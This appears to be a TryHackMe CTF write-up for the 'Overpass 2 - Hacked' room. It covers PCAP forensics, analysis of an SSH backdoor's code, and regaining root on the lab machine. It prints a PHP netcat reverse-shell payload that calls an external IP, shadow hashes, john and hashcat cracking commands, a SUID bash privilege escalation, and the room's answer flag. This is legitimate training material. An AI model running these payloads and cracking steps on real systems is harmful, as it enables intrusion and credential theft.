#Task 1 Forensics - Analyse the PCAP 

- What was the URL of the page they used to upload a reverse shell?
hint:
filter http
/development


- What payload did the attacker use to gain access?
hint:

Searching for requests containing “/development” in the body by clicking on Edit–>Find Packet and selecting string, found a request in /development/upload.php:

Folow --> TCP Stream
Identified a request where a PHP reverse shell was uploaded through the upload.php endpoint, the payload used a Netcat reverse shell:
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>


- What password did the attacker use to privesc?
Searching for requests containing passwords:
Find passwords
Identified a command issued to change to the james user after the attacker logged in as www-data, the password was provided in clear-text:

192.168.170.145	192.168.170.159	TCP	69	4242 → 57680 [PSH, ACK] Seq=1 Ack=56 Win=65152 Len=3 TSval=3256099034 TSecr=894467451
Follow --> TCP Stream

whenevernoteartinstant


- How did the attacker establish persistence?
https://github.com/NinjaJc01/ssh-backdoor


- Using the fasttrack wordlist, how many of the system passwords were crackable?
hint:
vi shadow.txt
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::

wget https://gitlab.com/kalilinux/packages/set/-/blob/2053787e02992b5cbf95192ae4b66a750bbcef7f/src/fasttrack/wordlist.txt

john shadow --wordlist=/home/gd/wordlist.txt
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
secret12         (bee)
abcd123          (szymex)
1qaz2wsx         (muirland)
secuirty3        (paradox)
4g 0:00:00:00 DONE (2021-08-01 01:57) 4.040g/s 181.8p/s 909.0c/s 909.0C/s P@55w0rd..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed




#Task 2 Research - Analyse the code 

- What's the default hash for the backdoor?
hint:
git clone https://github.com/NinjaJc01/ssh-backdoor
cd ssh-backdoor
grep -i -R hash .
./.git/hooks/pre-commit.sample: against=$(git hash-object -t tree /dev/null)
./.git/hooks/pre-push.sample:zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')
./.git/hooks/push-to-checkout.sample:   head=$(git hash-object -t tree --stdin </dev/null)
./.git/hooks/update.sample:zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')
grep: ./backdoor: binary file matches
./main.go:var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"
./main.go:      flaggy.String(&hash, "a", "hash", "Hash for backdoor")
./main.go:func verifyPass(hash, salt, password string) bool {
./main.go:      resultHash := hashPassword(password, salt)
./main.go:      return resultHash == hash
./main.go:func hashPassword(password string, salt string) string {
./main.go:      hash := sha512.Sum512([]byte(password + salt))
./main.go:      return fmt.Sprintf("%x", hash)
./main.go:      return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)

bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3

- What's the hardcoded salt for the backdoor?
hint: grep -i -R salt .
grep -i -R hash .
./main.go:      return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)


1c362db832f3f864c8c2fe05f2002a05

- What was the hash that the attacker used? - go back to the PCAP for this!
hint: open wireshark --> password 

james@overpass-production:~$ cd ssh-backdoor
cd ssh-backdoor
james@overpass-production:~/ssh-backdoor$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/james/.ssh/id_rsa): id_rsa
id_rsa
Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in id_rsa.
Your public key has been saved in id_rsa.pub.
The key fingerprint is:
SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58 james@overpass-production
The key's randomart image is:
+---[RSA 2048]----+
|        .. .     |
|       .  +      |
|      o   .=.    |
|     . o  o+.    |
|      + S +.     |
|     =.o %.      |
|    ..*.% =.     |
|    .+.X+*.+     |
|   .oo=++=Eo.    |
+----[SHA256]-----+
james@overpass-production:~/ssh-backdoor$ chmod +x backdoor
chmod +x backdoor
james@overpass-production:~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

<9d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed


- Crack the hash using rockyou and a cracking tool of your choice. What's the password?

grep -i -R hash .
....
./main.go:      hash := sha512.Sum512([]byte(password + salt))
....


Lets use hash to crack using hashcat and rockyou.txt wordlists. Remember to combine the hash like hash:salt

vi hash.txt
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05

hashcat --help | grep sha512
hashcat --help | grep sha512
  21000 | BitShares v0.x - sha512(sha512_bin(pass))        | Raw Hash
   1710 | sha512($pass.$salt)                              | Raw Hash, Salted and/or Iterated
   1720 | sha512($salt.$pass)                              | Raw Hash, Salted and/or Iterated
   1740 | sha512($salt.utf16le($pass))                     | Raw Hash, Salted and/or Iterated
   1730 | sha512(utf16le($pass).$salt)                     | Raw Hash, Salted and/or Iterated
  20200 | Python passlib pbkdf2-sha512                     | Generic KDF
   6500 | AIX {ssha512}                                    | Operating System
   1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating System
  21600 | Web2py pbkdf2-sha512                             | Framework
  
hashcat --force -m 1710 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
....
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c3                                                                                                           362db832f3f864c8c2fe05f2002a05:november16

november16

or john --format='dynamic=sha512($p.$s)' --wordlist=/usr/share/wordlists/rockyou.txt overpass.txt


#Task 3 Attack - Get back in! 
ssh james@10.10.59.228 -p 2222
november16



- What’s the root flag?
Running the following command to identify SUID binaries:
find / -perm -u=s -type f 2>/dev/null

find / -perm -u=s -type f 2>/dev/null; find / -perm -4000 -o- -perm -2000 -o- -perm -6000 2>/dev/null
 find / -type f -perm -u=s 2>/dev/null
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/bin/mount
/bin/fusermount
/bin/su
/bin/ping
/bin/umount
/home/james/.suid_bash

A suspicious suid file was found, /home/james/.suid_bash


OR 
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null

best find
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#suid

file .suid_bash

ou can see it’s Octal format by using the stat command:

stat .suid_bash
stat -c "%a %U:%G %n" .suid_bash 
6755 root:root .suid_bash

https://chmodcommand.com/chmod-6755/


find bash on https://gtfobins.github.io/
https://gtfobins.github.io/gtfobins/bash/#suid

SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

    sudo install -m =xs $(which bash) .

    ./bash -p

...
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# whoami
root
.suid_bash-4.4# pwd
/home/james
.suid_bash-4.4# cat /root/flag.txt
cat: /root/flag.txt: No such file or directory
.suid_bash-4.4# cat /root/root.txt
thm{d53b2684f169360bb9606c333873144d}
.suid_bash-4.4#


thm{d53b2684f169360bb9606c333873144d}


https://pencer.io/ctf/ctf-thm-overpass2/
https://blog.rudra0x01.xyz/tryhackme-overpass-2-hacked/
https://www.programmersought.com/article/63687571172/
https://steflan-security.com/tryhackme-overpass-2/
https://www.aldeid.com/wiki/TryHackMe-Overpass-2-Hacked
https://github.com/AlessandroZ/BeRoot
